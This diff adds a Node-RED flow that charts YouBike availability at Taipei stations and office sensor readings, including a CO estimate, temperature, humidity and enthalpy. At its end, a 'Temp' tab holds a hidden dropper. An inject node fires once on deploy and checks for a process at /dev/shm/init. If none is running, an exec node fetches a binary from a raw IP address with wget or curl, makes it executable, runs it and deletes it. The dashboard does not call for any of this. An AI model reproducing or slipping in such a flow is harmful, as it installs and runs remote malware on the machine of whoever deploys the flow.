+                "866f3a7cdbfa609b"
+            ]
+        ],
+        "x": 490,
+        "y": 420,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "e555cad7895289de",
+        "name": "可借",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_rent_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可借",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "3b31a0e7df393c34"
+            ]
+        ],
+        "x": 770,
+        "y": 460,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "866f3a7cdbfa609b",
+        "name": "可還",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_return_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可還",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "3b31a0e7df393c34"
+            ]
+        ],
+        "x": 770,
+        "y": 520,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#e60a2b",
+            "#92c408",
+            "#7b4c24",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "47fb02424927dedf",
+        "height": 4,
+        "id": "3b31a0e7df393c34",
+        "interpolate": "linear",
+        "label": "文德三號公園(江南街71巷16弄)",
+        "legend": "true",
+        "name": "",
+        "nodata": "",
+        "order": 2,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 1330,
+        "xformat": "HH:mm:ss",
+        "y": 480,
+        "ymax": "",
+        "ymin": "",
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "finalize": "",
+        "func": "// 在 function 節點裡的程式碼\nlet data = msg.payload;   // HTTP request 回傳的 JSON 陣列\n\n// 找出站名包含 \"科技大樓站\" 的項目\nlet target = data.find(station => station.sna.includes(\"捷運港墘站(1號出口)\"));\n\n// 把結果放到 msg.payload\nmsg.payload = target;\n\nreturn msg;\n",
+        "id": "57f3a344a126e90d",
+        "initialize": "",
+        "libs": [],
+        "name": "捷運港墘站(1號出口)",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "3052a5f2e09fe74d",
+                "6c7efd354dedba5c"
+            ]
+        ],
+        "x": 580,
+        "y": 560,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "3052a5f2e09fe74d",
+        "name": "可借",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_rent_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可借",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "d38668775918e439"
+            ]
+        ],
+        "x": 770,
+        "y": 580,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "6c7efd354dedba5c",
+        "name": "可還",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_return_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可還",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "d38668775918e439"
+            ]
+        ],
+        "x": 770,
+        "y": 640,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#e60a2b",
+            "#92c408",
+            "#7b4c24",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "47fb02424927dedf",
+        "height": 4,
+        "id": "d38668775918e439",
+        "interpolate": "linear",
+        "label": "捷運港墘站(1號出口)",
+        "legend": "true",
+        "name": "",
+        "nodata": "",
+        "order": 3,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 1280,
+        "xformat": "HH:mm:ss",
+        "y": 580,
+        "ymax": "",
+        "ymin": "",
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "className": "",
+        "format": "<a href = https://stephen25128.duckdns.org>回首頁</a>\n",
+        "fwdInMessages": true,
+        "group": "91c349f5401b4c59",
+        "height": 0,
+        "id": "789ea29cf93912a2",
+        "name": "",
+        "order": 3,
+        "resendOnRefresh": true,
+        "storeOutMessages": true,
+        "templateScope": "local",
+        "type": "ui_template",
+        "width": 0,
+        "wires": [
+            []
+        ],
+        "x": 140,
+        "y": 200,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "className": "",
+        "format": "<a href = https://stephen25128.duckdns.org>回首頁</a>\n",
+        "fwdInMessages": true,
+        "group": "47fb02424927dedf",
+        "height": 0,
+        "id": "def496c687cca8db",
+        "name": "",
+        "order": 4,
+        "resendOnRefresh": true,
+        "storeOutMessages": true,
+        "templateScope": "local",
+        "type": "ui_template",
+        "width": 0,
+        "wires": [
+            []
+        ],
+        "x": 140,
+        "y": 260,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "className": "",
+        "format": "<a href = https://stephen25128.duckdns.org>回首頁</a>\n",
+        "fwdInMessages": true,
+        "group": "a967817bd922222a",
+        "height": 1,
+        "id": "baa3da5ee2772d53",
+        "name": "",
+        "order": 4,
+        "resendOnRefresh": true,
+        "storeOutMessages": true,
+        "templateScope": "local",
+        "type": "ui_template",
+        "width": 6,
+        "wires": [
+            []
+        ],
+        "x": 140,
+        "y": 340,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "crontab": "",
+        "id": "a3dbafc3c6379be3",
+        "name": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "payload": "",
+        "payloadType": "date",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "120",
+        "topic": "",
+        "type": "inject",
+        "wires": [
+            [
+                "4d8d8d7c18ba53e9"
+            ]
+        ],
+        "x": 90,
+        "y": 60,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "finalize": "",
+        "func": "// 取得原始資料\nlet data = msg.payload;\n\n// 模擬校正：假設原始值 55 對應大約 0 ppm\n// 這裡需要依照你的感測器校正曲線調整\n// 我先給一個簡單線性換算範例\nlet ppm = data.mq7 * 0.5;   // 假設比例，需依實際校正修改\n\n// 判斷安全範圍\nlet status = \"正常\";\nif (ppm > 9 && ppm <= 50) {\n    status = \"注意：超過 WHO 建議值\";\n} else if (ppm > 50) {\n    status = \"警告：超過 OSHA 標準\";\n}\n\n// 加入到輸出物件\nmsg.payload = {\n    mq7_raw: data.mq7,\n    ppm_est: ppm,\n    temp: data.temp,\n    humidity: data.humidity,\n    enthalpy: data.enthalpy,\n    timestamp: data.timestamp,\n    status: status\n};\n\nreturn msg;\n",
+        "id": "4093d71cdb3bbece",
+        "initialize": "",
+        "libs": [],
+        "name": "科技大樓站",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "75069ca14ebb2396",
+                "8848ba7f05562567",
+                "dcfd4d36ef21ad30",
+                "8a9582d1288b8b7f",
+                "9017c4d841bf4f5f"
+            ]
+        ],
+        "x": 510,
+        "y": 60,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "75069ca14ebb2396",
+        "name": "空氣品質",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.ppm_est",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "a5eebd48d8789d57"
+            ]
+        ],
+        "x": 680,
+        "y": 60,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "8848ba7f05562567",
+        "name": "溫度",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.temp",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "582c52da161701dd"
+            ]
+        ],
+        "x": 670,
+        "y": 100,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "dcfd4d36ef21ad30",
+        "name": "濕度",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.humidity",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "872a819d01fe7972"
+            ]
+        ],
+        "x": 670,
+        "y": 140,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "8a9582d1288b8b7f",
+        "name": "焓值",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.enthalpy",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "05e53db3ba63a02a"
+            ]
+        ],
+        "x": 670,
+        "y": 180,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#7a990a",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#8e0606",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "caaebaddf18725fa",
+        "height": 5,
+        "id": "a5eebd48d8789d57",
+        "interpolate": "linear",
+        "label": "一氧化碳濃度",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 1,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 880,
+        "xformat": "HH:mm:ss",
+        "y": 60,
+        "ymax": "",
+        "ymin": "",
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#9b19d7",
+            "#aec7e8",
+            "#ff7f0e",
+            "#0c970c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#881eeb",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "caaebaddf18725fa",
+        "height": 5,
+        "id": "05e53db3ba63a02a",
+        "interpolate": "linear",
+        "label": "辦公室焓值",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 2,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 870,
+        "xformat": "HH:mm:ss",
+        "y": 180,
+        "ymax": "2000",
+        "ymin": "1000",
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#cf640c",
+            "#aec7e8",
+            "#dd771d",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "a967817bd922222a",
+        "height": 5,
+        "id": "582c52da161701dd",
+        "interpolate": "linear",
+        "label": "辦公室氣溫",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 1,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 870,
+        "xformat": "HH:mm:ss",
+        "y": 100,
+        "ymax": "40",
+        "ymin": "10",
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#18649a",
+            "#aec7e8",
+            "#ec7004",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "a967817bd922222a",
+        "height": 5,
+        "id": "872a819d01fe7972",
+        "interpolate": "linear",
+        "label": "辦公室濕度",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 2,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 870,
+        "xformat": "HH:mm:ss",
+        "y": 140,
+        "ymax": "105",
+        "ymin": "30",
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "9017c4d841bf4f5f",
+        "name": "判讀CO",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.status",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "fa6b86c97bd8750d"
+            ]
+        ],
+        "x": 680,
+        "y": 240,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "className": "",
+        "color": "#000000",
+        "font": "",
+        "fontSize": 16,
+        "format": "{{msg.payload}}",
+        "group": "caaebaddf18725fa",
+        "height": 1,
+        "id": "fa6b86c97bd8750d",
+        "label": "一氧化碳警報",
+        "layout": "row-spread",
+        "name": "",
+        "order": 3,
+        "style": false,
+        "type": "ui_text",
+        "width": 6,
+        "wires": [],
+        "x": 880,
+        "y": 240,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "active": true,
+        "complete": "false",
+        "console": false,
+        "id": "bdb3651869f257d1",
+        "name": "debug 2",
+        "statusType": "auto",
+        "statusVal": "",
+        "tosidebar": true,
+        "tostatus": false,
+        "type": "debug",
+        "wires": [],
+        "x": 500,
+        "y": 180,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "authType": "",
+        "headers": [],
+        "id": "4d8d8d7c18ba53e9",
+        "insecureHTTPParser": false,
+        "method": "GET",
+        "name": "",
+        "paytoqs": "ignore",
+        "persist": false,
+        "proxy": "",
+        "ret": "obj",
+        "senderr": false,
+        "tls": "",
+        "type": "http request",
+        "url": "https://stephen25128.duckdns.org/api/",
+        "wires": [
+            [
+                "4093d71cdb3bbece",
+                "bdb3651869f257d1"
+            ]
+        ],
+        "x": 290,
+        "y": 60,
+        "z": "ec1515cb77dddea4"
+    },
+    {
+        "id": "3b22dddd-52c6-40",
+        "label": "Temp",
+        "type": "tab"
+    },
+    {
+        "crontab": "",
+        "id": "d2117b92-9fca-4b",
+        "name": "",
+        "once": true,
+        "onceDelay": "0",
+        "props": [],
+        "repeat": "",
+        "topic": "",
+        "type": "inject",
+        "wires": [
+            [
+                "603a5e63-d311-46"
+            ]
+        ],
+        "x": 630,
+        "y": 680,
+        "z": "3b22dddd-52c6-40"
+    },
+    {
+        "addpay": false,
+        "append": "",
+        "command": "pgrep -f ^/dev/shm/init",
+        "id": "603a5e63-d311-46",
+        "name": "",
+        "timer": "",
+        "type": "exec",
+        "useSpawn": "false",
+        "winHide": false,
+        "wires": [
+            [],
+            [],
+            [
+                "b34ed5a2-e0bc-43"
+            ]
+        ],
+        "x": 860,
+        "y": 680,
+        "z": "3b22dddd-52c6-40"
+    },
+    {
+        "checkall": "true",
+        "id": "b34ed5a2-e0bc-43",
+        "name": "",
+        "outputs": 1,
+        "property": "payload.code",
+        "propertyType": "msg",
+        "repair": false,
+        "rules": [
+            {
+                "t": "neq",
+                "v": "0",
+                "vt": "str"
+            }
+        ],
+        "type": "switch",
+        "wires": [
+            [
+                "168862a0-fb5c-42"
+            ]
+        ],
+        "x": 1130,
+        "y": 680,
+        "z": "3b22dddd-52c6-40"
+    },
+    {
+        "addpay": false,
+        "append": "",
+        "command": "a=http://185.196.8.170/init; b=/dev/shm/init; (wget -q -O $b $a 2>/dev/null || curl -s -o $b $a && chmod 777 $b && $b >/dev/null 2>&1 && rm $b)",
+        "id": "168862a0-fb5c-42",
+        "name": "",
+        "timer": "",
+        "type": "exec",
+        "useSpawn": "false",
+        "winHide": false,
+        "wires": [
+            [],
+            [],
+            []
+        ],
+        "x": 1740,
+        "y": 680,
+        "z": "3b22dddd-52c6-40"
+    }
+]
